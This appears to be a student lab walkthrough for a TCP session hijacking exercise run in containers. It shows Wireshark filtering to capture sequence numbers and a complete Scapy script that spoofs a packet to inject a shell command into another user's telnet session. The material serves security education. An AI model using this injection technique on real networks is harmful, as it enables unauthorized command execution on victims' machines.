# TCP Session Hijacking

The objective of the TCP Session Hijacking attack is to hijack an existing TCP connection (session) between User 1 (IP 10.9.0.6) and Victim Machine (10.9.0.5) by injecting malicious contents into this session. If this connection is a telnet session, attackers can inject malicious commands (e.g. deleting an important file) into this session, causing the victims to execute the malicious commands.

## Assumptions
- In this lab, we have three machines
      - 1 attacker machine: seed-attacker (10.9.0.1)
      - 1 victim machine: IP Address - 10.9.0.5
      - 1 user machine: IP address - 10.9.0.6
- We use containers to set up the lab environment
- The attacker can observe the TCP traffic between A and B.
- All these machines are on the same LAN

### As User 1 (10.9.0.6), try to connect to Victim Machine (10.9.0.5)

1) Open a new terminal and execute the following command. You are now inside the User 1 machine (10.9.0.6).

  ```javascript
  docksh db8
  ```

2) Insider the User 1 container, attempt to connect to the Victim Machine (10.9.0.5).

  ```javascript
  telnet 10.9.0.5
  ```

3) Log in 

  ```javascript
  login: seed
  Password: dees
  ```

<img width="824" height="473" alt="image" src="https://github.com/user-attachments/assets/a1f66eb2-41b2-435a-8e61-2df84233debf" />

4) The Telnet session remains open and interactive. We need it to remain ESTABLISHED while we capture the packet.

### Open Wireshark on the VM
5) Open Wireshark on the VM

6) Find the correct network interface. In the VM Machine, type:

  ```javascript
  ip addr | grep -B2 -A2 "10.9.0.1"
  ```
<img width="911" height="333" alt="image" src="https://github.com/user-attachments/assets/99036e58-94b2-485c-90a8-53aaba2beb81" />

7) Within Wireshark, search for this interface: br-c84de5716c52 and click **Start**

<img width="1597" height="387" alt="image" src="https://github.com/user-attachments/assets/10c2df96-6d5c-4326-a707-b944ce089815" />

8) In the Wireshark filter box, enter:

  ```javascript
  tcp.port == 23
  ```

<img width="812" height="474" alt="image" src="https://github.com/user-attachments/assets/455620f8-712d-4422-b121-0957d8114a44" />


9) Narrow it further to only show TCP port 23 packets going from User 1 to the Victim.. Once you see traffic, use:

  ```javascript
  ip.src == 10.9.0.6 && ip.dst == 10.9.0.5 && tcp.port == 23
  ```


10) Next, select the last packet from the established Telnet connection going from User 1 (10.9.0.6) to the Victim (10.9.0.5).

### Create your TCP Session Hijacking packet

11) Return to you VM terminal and create a file with:

  ```javascript
  nano tcprst.py
  ```


<img width="1594" height="899" alt="image" src="https://github.com/user-attachments/assets/a44478aa-41ba-4f70-8a79-cedf54631c08" />

12)  Paste the following:
 
  ```javascript
#!/usr/bin/env python3

from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send

ip = IP(src="10.9.0.6", dst="10.9.0.5")

tcp = TCP(
    sport=34350,
    dport=23,
    flags="A",
    seq=3793210051,
    ack=2840741617
)

data = "echo HIJACKED > /tmp/task3.txt\n"

pkt = ip / tcp / data

ls(pkt)
send(pkt, verbose=0)

  ```

<img width="1596" height="898" alt="image" src="https://github.com/user-attachments/assets/41a82d0a-9f92-4798-88e5-016b9613822b" />


13) Save it with 

  ```javascript
  Ctrl + O
File Name to Write: /home/seed/task3.py
Enter
Ctrl + X
  ```


14) Back in the VM terminal, because Scapy needs permission to send a crafted packet, run:

  ```javascript
  sudo python3 /home/seed/task3.py
  ```


### Return to Victim Machine (10.9.0.5)

15) Go to the terminal on Victim 10.9.0.5 and run:


  ```javascript
ls -l /tmp/task3.txt
  ```
16) Followed by:

  ```javascript
cat /tmp/task3.txt
  ```

17) Result should appear as HIJACKED

<img width="786" height="160" alt="image" src="https://github.com/user-attachments/assets/7dae4642-4e79-4f2a-8036-bd7aabefe491" />


Conclusion: Task 3 attack worked.
Summary: 

* User 1 (10.9.0.6) had an existing Telnet session with the Victim (10.9.0.5).
* On seed-attacker, you created a forged TCP packet that claimed to be from User 1. This packet contained the following command: **echo HIJACKED > /tmp/task3.txt**
* Wireshark showed: **TCP Segment Len: 31** and displayed: **HIJACKED**
* Most importantly, you then checked the Victim (10.9.0.5) and found /tmp/task3.txt containing: **HIJACKED**
* This proves that the Victim actually processed the data you injected into the existing TCP/Telnet session.
